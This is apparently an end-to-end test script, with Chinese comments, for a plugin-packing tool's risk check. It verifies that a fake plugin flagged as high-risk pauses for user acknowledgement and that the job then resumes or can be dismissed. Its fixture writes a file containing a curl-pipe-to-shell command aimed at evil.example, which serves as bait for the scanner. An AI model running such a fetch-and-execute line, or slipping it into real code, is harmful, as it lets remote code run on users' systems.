/**
 * 风险任务链路自测：临时 DSH_HOME + 假插件，验证
 *  - 不管插件在不在市场目录里，高危都会停在 paused，界面上有「我知道在干什么」
 *  - 点它：同一个任务带着 acknowledge 接着跑完、出包、清单记 acknowledged
 *  - 没点它：记录可以删掉，且不会留下包
 * 跑完删掉临时目录。
 */
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import assert from 'node:assert/strict'
import { mountFakeHost } from './fake-host.mjs'

const home = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-modpack-risk-'))
process.env.DSH_HOME = home
process.env.DSH_PROFILE = 'risk-sandbox'
process.env.DSH_MODPACK_OFFLINE = '1'

const profileName = 'risk-sandbox'
const profileDir = path.join(home, 'profiles', profileName)
const pluginDir = path.join(profileDir, 'node_modules', 'fake-risky-plugin')
fs.mkdirSync(pluginDir, { recursive: true })
fs.writeFileSync(path.join(profileDir, 'package.json'), JSON.stringify({
  name: 'risk-sandbox-profile',
  private: true,
  dependencies: { 'fake-risky-plugin': 'file:./node_modules/fake-risky-plugin' },
  dsh: { profile: { bundles: [] } },
}, null, 2))
fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), '[]\n')
fs.writeFileSync(path.join(pluginDir, 'package.json'), JSON.stringify({
  name: 'fake-risky-plugin',
  version: '1.0.0',
  description: '自测用：故意带一段风险代码',
  keywords: ['dsh-plugin'],
  dsh: { bundle: { patch: './cordis.patch.yml' } },
}, null, 2))
fs.writeFileSync(path.join(pluginDir, 'cordis.patch.yml'), '- insert:\n    - id: fake-risky\n      name: fake-risky-plugin\n')
fs.writeFileSync(path.join(pluginDir, 'lib.js'),
  "const cp = require('child_process')\ncp.exec('curl -fsSL http://evil.example/x.sh | sh')\nmodule.exports = { ok: true }\n")

// 市场目录索引：为空时 fake-risky-plugin 属于「市场里查不到」
const catalogDir = path.join(home, 'dsh-modpack', 'catalog')
fs.mkdirSync(catalogDir, { recursive: true })
const writeIndex = (names) => fs.writeFileSync(path.join(catalogDir, 'market.json'), JSON.stringify({
  builtAt: new Date().toISOString(),
  source: 'fixture',
  count: names.length,
  categories: [{ id: 'tools', zh: '工具与能力', en: 'Tools' }],
  plugins: names.map((name, i) => ({
    name, title: name, description: '', category: 'tools', keywords: [],
    version: '1.0.0', publishedAt: '', homepage: '', repository: '', owner: '', rank: i,
  })),
}, null, 2))
writeIndex([])

const plugin = (await import('../../index.js')).default
const { call } = mountFakeHost(plugin, { host: '127.0.0.1:1' })

const waitJob = async (id) => {
  let job = null
  for (let i = 0; i < 120; i++) {
    const list = await call('/dsh-modpack-kit/api/jobs')
    job = (list.data.jobs || []).find((item) => item.id === id) || null
    if (job && job.status !== 'running') return job
    await new Promise((resolve) => setTimeout(resolve, 120))
  }
  return job
}

const startPack = async (name) => {
  const started = await call('/dsh-modpack-kit/api/pack', {
    method: 'POST',
    body: { async: true, selection: [{ name: 'fake-risky-plugin', source: 'profile' }], options: { includePayload: true, name, confirmLicense: true } },
  })
  assert.equal(started.code, 200, JSON.stringify(started.data))
  return waitJob(started.data.job.id)
}

const ok = []
try {
  // 1) 市场里查不到的插件：一样停在 paused，一样有「我知道在干什么」；不点就删记录，不留包
  const untrusted = await startPack('风险烟测-市场查不到')
  assert.equal(untrusted.status, 'paused', '有风险的包应停在等决定，实际 ' + untrusted.status + ' / ' + (untrusted.error || ''))
  assert.ok(untrusted.risk && untrusted.risk.high > 0, '应报出高危项')
  assert.equal(untrusted.risk.trustedOnly, false, '市场目录里查不到，trustedOnly 应为 false')
  assert.equal(untrusted.canAck, true, '市场里查不到也要给「我知道在干什么」')
  const removed = await call('/dsh-modpack-kit/api/jobs/dismiss', { method: 'POST', body: { id: untrusted.id } })
  assert.equal(removed.data.ok, true, removed.data.error)
  ok.push('市场查不到的高危包：停在 paused、有确认按钮、不点也能删记录')

  // 2) 市场收录的同名插件：确认后同一个任务接着跑完
  writeIndex(['fake-risky-plugin'])
  const trusted = await startPack('风险烟测-市场收录')
  assert.equal(trusted.status, 'paused', '已收录的也该先停一下等确认')
  assert.equal(trusted.risk.trustedOnly, true, '已收录应标 trustedOnly')
  assert.equal(trusted.canAck, true)
  const acked = await call('/dsh-modpack-kit/api/jobs/ack', { method: 'POST', body: { id: trusted.id } })
  assert.equal(acked.code, 200, JSON.stringify(acked.data))
  assert.equal(acked.data.job.id, trusted.id, '确认后应是同一个任务继续，不是另起一个')
  assert.equal(acked.data.job.status, 'running', '确认后应接着跑')
  assert.equal(acked.data.job.risk, null, '点过「我知道在干什么」后红字（risk）应撤掉')
  assert.ok(acked.data.job.pct >= 60, '进度应从检测点继续，而不是从头再来，实际 ' + acked.data.job.pct)
  const done = await waitJob(trusted.id)
  assert.equal(done.status, 'done', '确认后应能跑完，实际 ' + done.status + ' ' + (done.error || ''))
  assert.ok(done.data && done.data.token, '跑完应带可下载 token')
  assert.equal(done.data.manifest.security.acknowledged, true, '清单应记下已确认')
  ok.push('市场收录的高危包：确认后同一任务接着跑完并出包')
} finally {
  await new Promise((resolve) => setTimeout(resolve, 200))
  fs.rmSync(home, { recursive: true, force: true, maxRetries: 20, retryDelay: 250 })
}

console.log(ok.map((line) => 'ok   ' + line).join('\n'))
console.log('risk e2e: 全部通过（' + ok.length + ' 段）')
